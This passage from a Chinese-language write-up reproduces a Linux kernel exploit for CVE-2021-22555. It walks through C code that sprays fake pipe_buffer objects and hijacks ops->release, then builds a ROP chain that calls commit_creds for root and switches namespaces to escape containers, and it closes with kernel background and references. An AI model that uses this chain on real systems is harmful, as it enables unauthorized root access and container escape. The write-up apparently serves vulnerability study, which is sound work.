      }
      printf("[*] Leaking and freeing pipe_buffer object...\n");
      for (int i = 0; i ops`指向本堆块，再伪造`pipe_buffer->ops->release`指向第1个ROPgadget，劫持控制流。
      printf("[*] Spraying fake pipe_buffer objects...\n");
      memset(secondary_buf, 0, sizeof(secondary_buf));
      buf = (struct pipe_buffer *)&secondary_buf;
      buf->ops = kheap_addr + 0x290;
      ops = (struct pipe_buf_operations *)&secondary_buf[0x290];
    #ifdef KERNEL_COS_5_4_89
      // RAX points to &buf->ops.
      // RCX points to &buf.
      ops->release = kbase_addr + PUSH_RAX_JMP_QWORD_PTR_RCX;
    #elif KERNEL_UBUNTU_5_8_0_48
      // RSI points to &buf.
      ops->release = kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39;
    #endif
      build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0);
      if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) ops`时，rsi指向`pipe_buffer`地址，所以需构造ROP将RSI赋值给RSP
  * （1）没有找到类似`mov rsp, rsi`和`push rsi; pop rsp`的gadget，只能先伪造`pipe_buffer->ops`函数表，`pipe_buffer->ops->release`指向gadget—`push rsi; jmp qword ptr [rsi + 0x39]`
  * （2）在`RSI+0x39`处（`pipe_buffer+0x39`处）放置gadget—`pop rsp; ret;`
  * （3）在`RSI`处（`pipe_buffer`处）放置gadget—`add rsp, 0xd0; ret;` 避免破坏`pipe_buffer+0x10 - 0x18`
  * （4）在`RSI+0xd8`处（`pipe_buffer+0xd8`处）继续布置ROP链
  * （5）先将RBP保存到`RSI+0x2b0`处（`pipe_buffer+0x2b0`处），注意，`enter 0, 0` 指令等同于 `push rbp; mov rbp, rsp` —— `rbp=rsp`，`enter 8, 0` 指令等同于 `push rbp; mov rbp, rsp; sub rsp, 8`
          // Save RBP at scratchpad_addr.
      *rop++ = kbase_addr + ENTER_0_0_POP_RBX_POP_R12_POP_RBP_RET;                  // enter 0, 0 ; pop rbx ; pop r12 ; pop rbp ; ret 
      *rop++ = scratchpad_addr; // R12
      *rop++ = 0xDEADBEEF;      // RBP
      *rop++ = kbase_addr + MOV_QWORD_PTR_R12_RBX_POP_RBX_POP_R12_POP_RBP_RET;      // mov qword ptr [r12], rbx; pop rbx; pop r12; pop r13; pop rbp; ret;
      *rop++ = 0xDEADBEEF; // RBX
      *rop++ = 0xDEADBEEF; // R12
      *rop++ = 0xDEADBEEF; // R13
      *rop++ = 0xDEADBEEF; // RBP
  * （6）执行`commit_creds(prepare_kernel_cred(0))`提权 
          // commit_creds(prepare_kernel_cred(NULL))
      *rop++ = kbase_addr + POP_RDI_RET;                                            // pop rdi; ret;
      *rop++ = 0; // RDI
      *rop++ = kbase_addr + PREPARE_KERNEL_CRED;
      *rop++ = kbase_addr + POP_RCX_RET;                                            // pop rcx; ret;
      *rop++ = 4; // RCX
      *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;                              // cmp rcx, 4; jne 0x274579; pop rbp; ret; 
      *rop++ = 0xDEADBEEF; // RBP
      *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;                        // mov rdi, rax; jne 0x788d41; xor eax, eax; ret;
      *rop++ = kbase_addr + COMMIT_CREDS;
  * （7）从docker、k8s容器（[kubernetes](https://zhuanlan.zhihu.com/p/29232090)）中逃逸，参考[ The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation) 和 [利用 Linux 内核漏洞实现 Docker 逃逸](https://paper.seebug.org/1602/)。本环境没有用到容器，这一步不执行也能提权。如果Linux运行在容器环境中，即使提权成功，由于所在的命名空间权限受限，即使是root也会受限（如文件系统只读等）。方法1，可以将初始进程（pid=1）的`task_struct->fs`（存放着进程根目录及工作目录）复制到exp所在的进程，就能将exp进程的根目录设置到宿主机中了，但这种方法可能环境变量不对（需采用完整路径执行程序）；方法2，`task_struct->nsproxy`指向当前进程的命名空间，可以用系统初始化时的全局命名空间 **`init_nsproxy`** 替换exp所在进程的`nsproxy`，执行`switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)`即可。 
          // switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)
      *rop++ = kbase_addr + POP_RDI_RET;                                            // pop rdi; ret;
      *rop++ = 1; // RDI
      *rop++ = kbase_addr + FIND_TASK_BY_VPID;                                      // find_task_by_vpid
      *rop++ = kbase_addr + POP_RCX_RET;                                            // pop rcx; ret;
      *rop++ = 4; // RCX
      *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;                              // cmp rcx, 4; jne 0x274579; pop rbp; ret; 
      *rop++ = 0xDEADBEEF; // RBP
      *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;                        // mov rdi, rax; jne 0x788d41; xor eax, eax; ret;
      *rop++ = kbase_addr + POP_RSI_RET;                                            // pop rsi; ret;
      *rop++ = kbase_addr + INIT_NSPROXY; // RSI                                    // init_nsproxy
      *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES;                                 // switch_task_namespaces
  * （8）恢复rbp/rsp，`RSI+0x2b0`处（`pipe_buffer+0x2b0`处） 
          // Load RBP from scratchpad_addr and resume execution.
      *rop++ = kbase_addr + POP_RBP_RET;                                            // pop rbp; ret;
      *rop++ = scratchpad_addr - 0xA; // RBP
      *rop++ = kbase_addr + PUSH_QWORD_PTR_RBP_A_POP_RBP_RET;                       // push qword ptr [rbp + 0xa]; pop rbp; ret;
      *rop++ = kbase_addr + MOV_RSP_RBP_POP_RBP_RET;                                // mov rsp, rbp; pop rbp; ret;
**3-5 提权成功**
* * *
## 4\. 知识补充
**4-1 victim对象**
[pipe_buffer](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/pipe_fs_i.h#L26)
对象 ->
[pipe_buf_operations](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/pipe_fs_i.h#L93)
：包含全局函数表指针ops。
    struct pipe_buffer {
        struct page *page;                            // 读写pipe时, 实际上是读写page地址
        unsigned int offset, len;
        const struct pipe_buf_operations *ops;        // 
[do_pipe2()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L992)
->
[__do_pipe_flags()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L944)
->
[create_pipe_files()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L895)
->
[get_pipe_inode()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L863)
->
[alloc_pipe_info()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L766)
（2）[fifo_open()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L1090)
->
[alloc_pipe_info()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L766)
    struct pipe_inode_info *alloc_pipe_info(void)
    {
        struct pipe_inode_info *pipe;
        unsigned long pipe_bufs = PIPE_DEF_BUFFERS;            // pipe_bufs = 16
        struct user_struct *user = get_current_user();
        unsigned long user_bufs;
        unsigned int max_size = READ_ONCE(pipe_max_size);
        pipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);    // 分配 pipe_inode_info 结构
        ... ...
        pipe->bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),            // 分配大小 16*sizeof(pipe_buffer) = 16*0x28 = 370, 注意也是 GFP_KERNEL_ACCOUNT 标志
                     GFP_KERNEL_ACCOUNT);
        ... ...
        return NULL;
    }
**[pipe_buffer](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/pipe_fs_i.h#L26)释放**：[pipe_release()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L699)
->
[put_pipe_info()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L695)
->
[free_pipe_info](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L830)
->
[pipe_buf_release()](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/pipe_fs_i.h#L195)
调用`pipe_buffer->ops->release` 函数，可劫持控制流。
    static inline void pipe_buf_release(struct pipe_inode_info *pipe,
                        struct pipe_buffer *buf)
    {
        const struct pipe_buf_operations *ops = buf->ops;
        buf->ops = NULL;
        ops->release(pipe, buf);                    // 劫持控制流
    }
**4-2 spray对象**
**SKB喷射** ：采用`socketpair()`创建一对无名的、相互连接的套接字，`int socketpair(int domain, int
type, int protocol, int sv[2])`，函数成功则返回0， **创建好的套接字分别是sv[0]和sv[1]**
，失败则返回-1。可以往sv[0]中写，从sv[1]中读；或者从sv[1]中写，从sv[0]中读，相关函数为`write()`和`read()`。也可以调用`sendmsg()`和`recvmsg()`来发送和接收数据，用户参数是`msghdr`结构。本exp是采用`write()`和`read()`进行堆喷和释放的。
**4-3`GFP_KERNEL_ACCOUNT`标志**
为了使`xt_table_info`漏洞对象、spray对象、victim对象、占位对象位于同一cache，由于漏洞对象是用`GFP_KERNEL_ACCOUNT`标志分配的，所以其他对象也应该用`GFP_KERNEL_ACCOUNT`标志来分配（原作者指出，在linux
5.9之前，不同的slab被用于计数）。victim对象——`pipe_buffer`结构和占位对象——`msg_msg`结构（参见文章`[7]`中的分析）都是用`GFP_KERNEL_ACCOUNT`标志来分配的。
**4-4 64位系统下编译32位程序**
    # gcc -m32 选项 
    $ sudo apt-get update
    $ sudo apt-get purge libc6-dev
    $ sudo apt-get install libc6-dev
    $ sudo apt-get install libc6-dev-i386
* * *
## 参考
[1]  —— 漏洞公告
[2] [CVE-2021-22555: Turning \x00\x00 into
10000$](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html) —— writeup英文
[3] [CVE-2021-22555-exploit](https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/exploit.c) —— exp
[4] [CVE-2021-22555: 从 x00x00
到10000$奖金](https://www.freebuf.com/vuls/281115.html) —— writeup中文
[5] [隐藏十五年的漏洞：CVE-2021-22555
漏洞分析与复现](https://www.freebuf.com/articles/system/286366.html) —— writeup中文
[6] [CVE-2021-22555 linux内核提权](https://www.anquanke.com/post/id/247830) ——
writeup中文
[7] [Linux内核中利用msg_msg结构实现任意地址读写](https://www.anquanke.com/post/id/252558) ——
`msg_msg`结构的创建与读取，占位对象
[8]
[socketpair的用法和理解](https://blog.csdn.net/weixin_40039738/article/details/81095013)
—— `socketpair()` 函数，用于堆喷
[9] [Linux进程间通信（七）：消息队列
msgget()、msgsend()、msgrcv()、msgctl()](https://www.cnblogs.com/52php/p/5862114.html)
—— 创建`msg_msg`结构，用于堆喷
[10]
[Linux系统调用：pipe()系统调用源码分析](https://blog.csdn.net/Rong_Toa/article/details/116270704)
—— `pipe`堆喷
[11] [一、Netfilter简介](http://blog.chinaunix.net/uid-9829088-id-5790559.html) ——
Netfiler 背景知识
[12] [linux内核协议栈 netfilter 之 ip
层的table、rule、match、target结构分析](https://blog.csdn.net/wangquan1992/article/details/109391303)
—— Netfiler 背景知识
[13] [ The Route to Root: Container Escape Using Kernel
Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation) —— 容器逃逸方法 英文
[14] [利用 Linux 内核漏洞实现 Docker 逃逸](https://paper.seebug.org/1602/) —— 容器逃逸方法 中文